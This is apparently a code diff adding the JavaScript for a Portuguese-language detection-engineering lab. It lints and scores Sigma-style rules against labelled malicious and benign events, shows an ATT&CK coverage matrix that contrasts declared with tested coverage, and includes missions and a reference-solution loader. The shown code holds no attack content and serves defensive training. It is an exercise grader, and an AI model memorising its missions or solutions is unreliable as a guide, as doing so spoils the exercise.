+            if ((tl === "1" || tl === "all") && ver() === "of") {
+                pegar();
+                var alvo = pegar();
+                var lst = alvo.toLowerCase() === "them" ? nomes.slice() : nomes.filter(function(n) { return curinga(alvo).test(n.toLowerCase()); });
+                if (!lst.length) throw erroRegra("'" + alvo + "' não corresponde a nenhuma seleção");
+                return tl === "1" ? function(r) { return lst.some(function(n) { return r[n]; }); } : function(r) { return lst.every(function(n) { return r[n]; }); };
+            }
+            if (["and", "or", "not", "of", "|"].indexOf(tl) !== -1) throw erroRegra("palavra '" + t + "' fora do lugar na condition");
+            if (nomes.indexOf(t) === -1) throw erroRegra("a condition cita '" + t + "', que não existe em detection");
+            return function(r) { return r[t]; };
+        }
+        if (!tokens.length) throw erroRegra("condition vazia");
+        var f = ou();
+        if (pos !== tokens.length) throw erroRegra("sobrou '" + tokens[pos] + "' no fim da condition");
+        return f;
+    }
+    function preparar(texto) {
+        var regra = window.lerYamlSigma(texto);
+        if (!ehMapa(regra.logsource) || !Object.keys(regra.logsource).length) throw erroRegra("falta o bloco logsource");
+        var det = regra.detection;
+        if (!ehMapa(det)) throw erroRegra("falta o bloco detection");
+        if (typeof det.condition !== "string") throw erroRegra("detection precisa de uma condition");
+        var nomes = Object.keys(det).filter(function(n) { return n !== "condition"; });
+        if (!nomes.length) throw erroRegra("detection precisa de ao menos uma seleção");
+        nomes.forEach(function(n) {
+            var sel = det[n];
+            if (!ehMapa(sel) || !Object.keys(sel).length) throw erroRegra("a seleção '" + n + "' precisa ser um mapa de campos");
+            Object.keys(sel).forEach(function(chave) {
+                chave.split("|").slice(1).forEach(function(m) {
+                    if (MODS.indexOf(m) === -1) throw erroRegra("modificador '" + m + "' não suportado nesta bancada");
+                });
+                var vals = Array.isArray(sel[chave]) ? sel[chave] : [sel[chave]];
+                if (!vals.length || vals.some(function(v) { return v === null || typeof v === "object"; })) throw erroRegra("o campo '" + chave + "' em '" + n + "' está sem valor");
+            });
+        });
+        regra._cond = compilarCondicao(det.condition, nomes);
+        regra._nomes = nomes;
+        return regra;
+    }
+    function campo(e, nome) {
+        var ks = Object.keys(e.campos);
+        for (var i = 0; i < ks.length; i++) if (ks[i].toLowerCase() === nome.toLowerCase()) return e.campos[ks[i]];
+        return null;
+    }
+    function casaValor(valor, esperado, mods) {
+        if (valor === null || valor === undefined) return false;
+        var a = String(valor).toLowerCase(), b = String(esperado).toLowerCase();
+        if (mods.indexOf("contains") !== -1) return a.indexOf(b) !== -1;
+        if (mods.indexOf("startswith") !== -1) return a.indexOf(b) === 0;
+        if (mods.indexOf("endswith") !== -1) return a.length >= b.length && a.slice(a.length - b.length) === b;
+        return a === b;
+    }
+    function casaSelecao(e, sel) {
+        return Object.keys(sel).every(function(chave) {
+            var partes = chave.split("|"), nome = partes[0], mods = partes.slice(1);
+            var vals = Array.isArray(sel[chave]) ? sel[chave] : [sel[chave]];
+            var testes = vals.map(function(v) { return casaValor(campo(e, nome), v, mods); });
+            return mods.indexOf("all") !== -1 ? testes.every(Boolean) : testes.some(Boolean);
+        });
+    }
+    function regraCasa(regra, e) {
+        var ls = Object.keys(regra.logsource).every(function(k) {
+            var v = e.logsource[k] === undefined ? "" : e.logsource[k];
+            return String(v).toLowerCase() === String(regra.logsource[k]).toLowerCase();
+        });
+        if (!ls) return false;
+        var r = {};
+        regra._nomes.forEach(function(n) { r[n] = casaSelecao(e, regra.detection[n]); });
+        return regra._cond(r);
+    }
+    function metadados(regra, tid) {
+        var erros = [];
+        if (typeof regra.title !== "string" || !regra.title.trim()) erros.push("title");
+        if (ED.niveis.indexOf(regra.level) === -1) erros.push("level");
+        var tags = Array.isArray(regra.tags) ? regra.tags : [];
+        if (tags.map(function(t) { return String(t).toLowerCase(); }).indexOf("attack." + tid.toLowerCase()) === -1) erros.push("tag");
+        return erros;
+    }
+    function conjuntoTeste(tid) {
+        return ED.eventos.filter(function(e) { return e.rotulo === "malicioso" && e.tecnica === tid; })
+            .concat(ED.eventos.filter(function(e) { return e.rotulo === "benigno"; }));
+    }
+    window.avaliarRegraBancada = function(tid, texto) {
+        var res = { lint: null, metadados: [], vp: 0, fp: 0, fn: 0, vn: 0, volume: 0, classe: {}, passou: false };
+        var regra;
+        try { regra = preparar(texto); } catch (err) { res.lint = err.regra ? err.message : "erro inesperado: " + err.message; return res; }
+        conjuntoTeste(tid).forEach(function(e) {
+            var positivo = e.rotulo === "malicioso", casou = regraCasa(regra, e), c;
+            if (positivo) c = casou ? "vp" : "fn";
+            else if (casou) { c = "fp"; res.volume += e.frequencia_dia; }
+            else c = "vn";
+            res[c]++;
+            res.classe[e.id] = c;
+        });
+        res.metadados = metadados(regra, tid);
+        res.passou = !res.metadados.length && res.fn === 0 && res.fp === 0;
+        return res;
+    };
+
+    // ===================================================== missões
+    function concluir(id) { if (!feitas[id]) { feitas[id] = true; renderizarMissoes(); } }
+    function renderizarMissoes() {
+        var ul = document.getElementById("ed-missoes");
+        ul.replaceChildren();
+        ED.missoes.forEach(function(m) {
+            var li = el("li", (feitas[m.id] ? "✓ " : "○ ") + m.texto, "color: " + (feitas[m.id] ? "var(--tip-color)" : "var(--ink)") + ";");
+            li.setAttribute("data-missao", m.id);
+            li.setAttribute("data-feita", feitas[m.id] ? "sim" : "nao");
+            ul.appendChild(li);
+        });
+    }
+    function verificarMissoes() {
+        if (estado["T1558.003"].status === "coberta") concluir("volume");
+        if (estado["T1490"].status === "coberta") concluir("logsource");
+        if (estado["T1136.001"].status === "coberta") concluir("do_zero");
+        if (bancada().every(function(t) { return estado[t.id].status === "coberta"; })) concluir("cobertura");
+    }
+
+    // ===================================================== matriz de cobertura
+    var STATUS = {
+        coberta: ["Coberta: passou no teste", "var(--tip-color)", "solid"],
+        falha: ["Regra existe, falhou no teste", "var(--danger-color)", "solid"],
+        nao_testada: ["Regra existe, não testada", "var(--warning-color)", "solid"],
+        sem_regra: ["Sem regra", "var(--muted)", "dashed"],
+        sem_telemetria: ["Sem telemetria", "var(--muted)", "dashed"]
+    };
+    function statusDe(t) { return t.bancada ? estado[t.id].status : "sem_telemetria"; }
+    function renderizarMatriz() {
+        var box = document.getElementById("ed-matriz");
+        box.replaceChildren();
+        ED.taticas.forEach(function(ta) {
+            var col = el("div", null, "display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.35rem; align-content: start; min-width: 0;");
+            var cab = el("div", null, "border-bottom: 2px solid var(--rule); padding-bottom: 0.2rem;");
+            cab.appendChild(el("strong", ta.nome));
+            cab.appendChild(el("div", ta.id + " · " + ta.pt, "color: var(--muted); font-size: 0.72rem;"));
+            col.appendChild(cab);
+            ED.tecnicas.filter(function(t) { return t.tatica === ta.id; }).forEach(function(t) {
+                var st = statusDe(t), info = STATUS[st];
+                var cel = el(t.bancada ? "button" : "div", null, "text-align: left; font: inherit; color: var(--ink); background: var(--surface); border: 2px " + info[2] + " " + info[1] + "; border-radius: var(--radius-sm); padding: 0.35rem 0.45rem; min-width: 0; overflow-wrap: anywhere;" + (t.bancada ? " cursor: pointer;" : "") + (t.id === selecionada ? " box-shadow: 0 0 0 2px var(--accent);" : ""));
+                cel.setAttribute("data-tecnica", t.id);
+                cel.setAttribute("data-status", st);
+                if (t.bancada) {
+                    cel.type = "button";
+                    cel.setAttribute("aria-pressed", t.id === selecionada ? "true" : "false");
+                    cel.addEventListener("click", function() { selecionar(t.id); });
+                }
+                cel.appendChild(el("strong", t.id, "display: block;"));
+                cel.appendChild(el("span", t.nome, "display: block;"));
+                cel.appendChild(el("span", info[0], "display: block; color: " + info[1] + "; font-weight: 600; font-size: 0.72rem; margin-top: 0.15rem;"));
+                if (!t.bancada) cel.appendChild(el("span", t.motivo, "display: block; color: var(--muted); font-size: 0.7rem; margin-top: 0.15rem;"));
+                col.appendChild(cel);
+            });
+            box.appendChild(col);
+        });
+        var total = ED.tecnicas.length;
+        var declaradas = bancada().filter(function(t) { return ["nao_testada", "falha", "coberta"].indexOf(estado[t.id].status) !== -1; }).length;
+        var testadas = bancada().filter(function(t) { return estado[t.id].status === "coberta"; }).length;
+        var cob = document.getElementById("ed-cobertura");
+        cob.replaceChildren();
+        cob.setAttribute("data-declarada", declaradas);
+        cob.setAttribute("data-testada", testadas);
+        cob.appendChild(el("span", "Cobertura declarada (existe regra): " + declaradas + " de " + total + " técnicas", "display: inline-block; margin-right: 1rem; color: var(--warning-color); font-weight: 600;"));
+        cob.appendChild(el("span", "Cobertura testada (a regra passou): " + testadas + " de " + total + " técnicas", "display: inline-block; color: var(--tip-color); font-weight: 600;"));
+    }
+    function renderizarTecnicas() {
+        var box = document.getElementById("ed-tecnicas");
+        box.replaceChildren();
+        bancada().forEach(function(t) {
+            var b = el("button", t.id, t.id === selecionada ? "outline: 2px solid var(--accent);" : "");
+            b.type = "button";
+            b.className = t.id === selecionada ? "btn-primary" : "btn-secondary";
+            b.setAttribute("data-tecnica", t.id);
+            b.setAttribute("aria-pressed", t.id === selecionada ? "true" : "false");
+            b.addEventListener("click", function() { selecionar(t.id); });
+            box.appendChild(b);
+        });
+    }
+
+    // ===================================================== pipeline, métricas e eventos
+    function renderizarPipeline() {
+        var box = document.getElementById("ed-pipeline"), met = document.getElementById("ed-metricas");
+        var r = estado[selecionada].resultado, t = tecnica(selecionada);
+        box.replaceChildren(); met.replaceChildren();
+        box.removeAttribute("data-passou");
+        if (!r) { box.appendChild(el("p", "Regra ainda não testada nesta versão: rode os testes.", "margin: 0; color: var(--muted);")); return; }
+        box.setAttribute("data-passou", r.passou ? "sim" : "nao");
+        var ids = function(c) { return Object.keys(r.classe).filter(function(k) { return r.classe[k] === c; }); };
+        var positivos = r.vp + r.fn, negativos = r.fp + r.vn, nomesMeta = { title: "title", level: "level válido (" + ED.niveis.join(", ") + ")", tag: "a tag attack." + t.id.toLowerCase() };
+        var etapas = [];
+        etapas.push(r.lint ? [false, "Lint: " + r.lint] : [true, "Lint: YAML, seleções e condition válidos"]);
+        if (r.lint) {
+            ["Metadados", "Testes positivos", "Testes negativos"].forEach(function(n) { etapas.push([null, n + ": não executado"]); });
+        } else {
+            etapas.push(r.metadados.length ? [false, "Metadados: falta " + r.metadados.map(function(m) { return nomesMeta[m]; }).join(", ")] : [true, "Metadados: title, level e tag attack." + t.id.toLowerCase()]);
+            etapas.push(r.fn ? [false, "Testes positivos: " + r.vp + " de " + positivos + " ataques detectados; não detectou " + ids("fn").join(", ")] : [true, "Testes positivos: " + r.vp + " de " + positivos + " ataques detectados"]);
+            etapas.push(r.fp ? [false, "Testes negativos: " + r.fp + " falso(s) positivo(s) (" + ids("fp").join(", ") + "), cerca de " + fmt(r.volume) + " alertas falsos por dia"] : [true, "Testes negativos: nenhum falso positivo em " + negativos + " eventos legítimos"]);
+        }
+        var ol = el("ol", null, "margin: 0; padding-left: 1.3rem; display: grid; gap: 0.2rem;");
+        etapas.forEach(function(e) {
+            var cor = e[0] === null ? "var(--muted)" : e[0] ? "var(--tip-color)" : "var(--danger-color)";
+            var li = el("li", (e[0] === null ? "– " : e[0] ? "✓ " : "✕ ") + e[1], "color: " + cor + ";");
+            li.setAttribute("data-ok", e[0] === null ? "pulado" : e[0] ? "sim" : "nao");
+            ol.appendChild(li);
+        });
+        box.appendChild(ol);
+        box.appendChild(el("strong", r.passou ? "Merge liberado: a regra vai para produção e " + t.id + " conta como coberta na matriz." : "Merge bloqueado: corrija a regra e rode os testes de novo.", "display: block; margin-top: 0.4rem; color: " + (r.passou ? "var(--tip-color)" : "var(--danger-color)") + ";"));
+        if (r.lint) return;
+        var prec = r.vp + r.fp ? Math.round(100 * r.vp / (r.vp + r.fp)) + "%" : "— (sem disparos)";
+        var rev = positivos ? Math.round(100 * r.vp / positivos) + "%" : "—";
+        [["VP", r.vp, "vp"], ["FP", r.fp, "fp"], ["FN", r.fn, "fn"], ["VN", r.vn, "vn"], ["Precisão", prec, "precisao"], ["Revocação", rev, "revocacao"], ["Alertas falsos/dia", fmt(r.volume), "volume"]].forEach(function(m) {
+            var ruim = (m[2] === "fp" || m[2] === "fn" || m[2] === "volume") && r[m[2]] > 0;
+            var d = el("div", null, "border: 1px solid " + (ruim ? "var(--danger-color)" : "var(--rule)") + "; border-radius: var(--radius-sm); padding: 0.3rem 0.45rem; background: var(--sunk); min-width: 0;");
+            d.setAttribute("data-metrica", m[2]);
+            d.appendChild(el("div", m[0], "font-size: 0.7rem; color: var(--muted);"));
+            d.appendChild(el("strong", String(m[1]), "font-size: 1rem; color: " + (ruim ? "var(--danger-color)" : "var(--ink)") + ";"));
+            met.appendChild(d);
+        });
+    }
+    var CLASSES = { vp: ["VP: detectado", "var(--tip-color)"], fn: ["FN: ataque não detectado", "var(--danger-color)"], fp: ["FP: alerta falso", "var(--danger-color)"], vn: ["VN: ignorado corretamente", "var(--muted)"] };
+    function renderizarEventos() {
+        var box = document.getElementById("ed-eventos"), r = estado[selecionada].resultado;
+        var classe = r && !r.lint ? r.classe : {};
+        box.replaceChildren();
+        conjuntoTeste(selecionada).forEach(function(e) {
+            var c = classe[e.id], info = c ? CLASSES[c] : ["—", "var(--rule)"];
+            var d = el("div", null, "border-left: 4px solid " + info[1] + "; background: var(--sunk); border-radius: var(--radius-sm); padding: 0.3rem 0.5rem; min-width: 0;");
+            d.setAttribute("data-evento", e.id);
+            d.setAttribute("data-classe", c || "");
+            var cab = el("div", null, "display: flex; flex-wrap: wrap; gap: 0.2rem 0.6rem; align-items: baseline;");
+            cab.appendChild(el("strong", e.id + " · " + (e.rotulo === "malicioso" ? "Malicioso (" + e.tecnica + ")" : "Benigno (" + fmt(e.frequencia_dia) + " por dia)"), "color: " + (e.rotulo === "malicioso" ? "var(--danger-color)" : "var(--ink)") + ";"));
+            cab.appendChild(el("span", e.resumo, "color: var(--muted);"));
+            if (c) cab.appendChild(el("span", info[0], "font-weight: 600; color: " + info[1] + ";"));
+            d.appendChild(cab);
+            var linhas = ["logsource: " + Object.keys(e.logsource).map(function(k) { return k + "=" + e.logsource[k]; }).join(", ")];
+            Object.keys(e.campos).forEach(function(k) { linhas.push(k + ": " + e.campos[k]); });
+            d.appendChild(el("div", linhas.join("\n"), "font-family: var(--font-mono); font-size: 0.72rem; white-space: pre-wrap; overflow-wrap: anywhere; margin-top: 0.2rem;"));
+            box.appendChild(d);
+        });
+    }
+    function renderizarTudo() {
+        renderizarMatriz(); renderizarTecnicas(); renderizarPipeline(); renderizarEventos();
+    }
+
+    // ===================================================== interface
+    function selecionar(tid) {
+        selecionada = tid;
+        var t = tecnica(tid);
+        document.getElementById("ed-editor").value = estado[tid].texto;
+        document.getElementById("ed-titulo-regra").textContent = tid + " — " + t.nome + (t.rascunho === null ? " (sem regra: comece pelo modelo)" : "");
+        document.getElementById("ed-dica").textContent = "";
+        renderizarTudo();
+    }
+    function aoEditar() {
+        var s = estado[selecionada], antes = s.status, tinha = !!s.resultado;
+        s.texto = document.getElementById("ed-editor").value;
+        s.status = "nao_testada";
+        s.resultado = null;
+        if (antes !== s.status) renderizarMatriz();
+        if (tinha) { renderizarPipeline(); renderizarEventos(); }
+    }
+    function rodar(tid) {
+        var r = window.avaliarRegraBancada(tid, estado[tid].texto);
+        estado[tid].resultado = r;
+        estado[tid].status = r.passou ? "coberta" : "falha";
+        return r;
+    }
+    window.executarBancada = function() {
+        estado[selecionada].texto = document.getElementById("ed-editor").value;
+        var r = rodar(selecionada);
+        document.getElementById("ed-resumo").textContent = "";
+        verificarMissoes();
+        renderizarTudo();
+        return r;
+    };
+    window.executarTodasBancada = function() {
+        if (selecionada) estado[selecionada].texto = document.getElementById("ed-editor").value;
+        var antes = bancada().filter(function(t) { return ["nao_testada", "falha", "coberta"].indexOf(estado[t.id].status) !== -1; });
+        var passaram = antes.filter(function(t) { return rodar(t.id).passou; }).length;
+        var semRegra = bancada().length - antes.length;
+        document.getElementById("ed-resumo").textContent = "Rodadas " + antes.length + " regras: " + passaram + " passaram e " + (antes.length - passaram) + " falharam." + (semRegra ? " " + semRegra + " técnica(s) da bancada sem regra." : "") + " O painel contava " + antes.length + " técnicas cobertas; o teste confirma " + passaram + ".";
+        concluir("declarada");
+        verificarMissoes();
+        renderizarTudo();
+        return { rodadas: antes.length, passaram: passaram };
+    };
+    window.mostrarDicaBancada = function() {
+        document.getElementById("ed-dica").textContent = "Dica: " + tecnica(selecionada).dica;
+    };
+    window.carregarSolucaoBancada = function() {
+        document.getElementById("ed-editor").value = tecnica(selecionada).gabarito;
+        aoEditar();
+        document.getElementById("ed-dica").textContent = "Solução de referência carregada. Leia o YAML, compare com o rascunho e rode os testes.";
+    };
+    window.restaurarRegraBancada = function() {
+        var t = tecnica(selecionada);
+        estado[selecionada] = { texto: t.rascunho !== null ? t.rascunho : ED.modelo_vazio, status: t.rascunho !== null ? "nao_testada" : "sem_regra", resultado: null };
+        selecionar(selecionada);
+    };
+    window.restaurarBancada = function() {
+        estado = {}; feitas = {};
+        bancada().forEach(function(t) {
+            estado[t.id] = { texto: t.rascunho !== null ? t.rascunho : ED.modelo_vazio, status: t.rascunho !== null ? "nao_testada" : "sem_regra", resultado: null };
+        });
+        document.getElementById("ed-resumo").textContent = "";
+        renderizarMissoes();
+        selecionar("T1558.003");
+    };
+    window.estadoBancada = function() { return estado; };
+
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("ed-contexto").textContent = ED.contexto;
+        document.getElementById("ed-editor").addEventListener("input", aoEditar);
+        restaurarBancada();
+        if (typeof initChecklist === "function") {
+            initChecklist("engenharia-deteccao");
+        }
+        if (typeof initQuiz === "function") {
+            initQuiz();
+        }
+    });
+})();
+</script>
